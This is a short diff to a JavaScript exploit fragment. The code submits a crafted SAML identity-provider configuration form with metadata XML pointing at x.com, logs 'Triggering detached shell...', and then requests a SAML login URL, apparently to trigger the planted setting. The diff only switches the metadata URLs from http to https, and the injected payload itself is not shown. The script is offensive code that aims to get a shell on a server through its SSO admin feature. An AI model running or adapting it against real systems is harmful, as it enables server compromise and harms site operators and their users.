@@ -15,9 +15,9 @@
        formData.append('priority', '0');
        formData.append('use_custom_attribute_map', 'on');
        formData.append('attribute_mapping', '{"email":["mail"]}');
-       formData.append('saml_metadata_xml', `<?xml version="1.0"?><md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="http://x.com"><md:IDPSSODescriptor
+       formData.append('saml_metadata_xml', `<?xml version="1.0"?><md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="https://x.com"><md:IDPSSODescriptor
    protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"><md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
-   Location="http://x.com/sso"/></md:IDPSSODescriptor></md:EntityDescriptor>`);
+   Location="https://x.com/sso"/></md:IDPSSODescriptor></md:EntityDescriptor>`);
        formData.append('_save', 'Save');
   
        console.log("Triggering detached shell...");
@@ -26,4 +26,3 @@
            setTimeout(() => { fetch('/saml2/login/' + slug + '/'); }, 500);
        });
    })();
-
